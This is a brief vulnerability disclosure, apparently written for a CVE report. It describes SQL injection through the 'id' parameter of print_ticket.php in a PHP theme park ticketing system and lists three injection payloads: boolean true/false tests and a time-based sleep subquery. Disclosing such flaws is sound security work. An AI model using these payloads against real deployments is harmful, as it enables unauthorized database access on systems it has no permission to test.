# Theme Park Ticketing System v1.0 has SQL injection

BUG_Author: dengbaihao

Website source code address: https://www.sourcecodester.com/php/14613/theme-park-ticketing-system-using-phpmysqli-source-code.html

Vulnerability File: /tpts/print_ticket.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=1 AND 666=666

![image](https://github.com/XIAONIGM/CVEReport/blob/main/3.png)

Payload2:id=1 AND 666=999

![image](https://github.com/XIAONIGM/CVEReport/blob/main/4.png)

Payload3:id=1 and (select 2 from (select(sleep(10)))c)

![image](https://github.com/XIAONIGM/CVEReport/blob/main/5.png)
